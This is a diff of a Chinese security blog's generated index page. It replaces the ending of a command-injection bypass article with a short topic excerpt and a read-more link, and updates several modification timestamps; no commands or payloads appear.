-<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>命令注入绕过是一场持续的攻防博弈。攻击者不断利用 Shell 的灵活特性寻找新的绕过方式，防御方则需要从源头消除命令执行的可能。本文覆盖的技巧在实际渗透测试项目中屡经验证，建议读者在安全评估中合理使用、在安全建设中针对性加固。</p>
-<p>理解绕过不是为了攻击，而是为了更好地防御。</p>
-<hr>
-<p><em>本文发表于 2026 年 2 月 1 日，部分技术细节可能随软件版本更新而变化。所有测试均在授权环境中完成。</em></p>
-
+          <p>命令注入绕过——空格/关键字/长度限制绕过、无字母数字 Shell、Base64 编码执行与 WAF 规避技巧汇总。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/Command-injection-bypass/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1084,7 +741,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1176,7 +833,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1268,7 +925,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:14" itemprop="dateModified" datetime="2026-06-05T13:34:14+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1360,7 +1017,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:12:35" itemprop="dateModified" datetime="2026-06-05T00:12:35+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1452,7 +1109,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
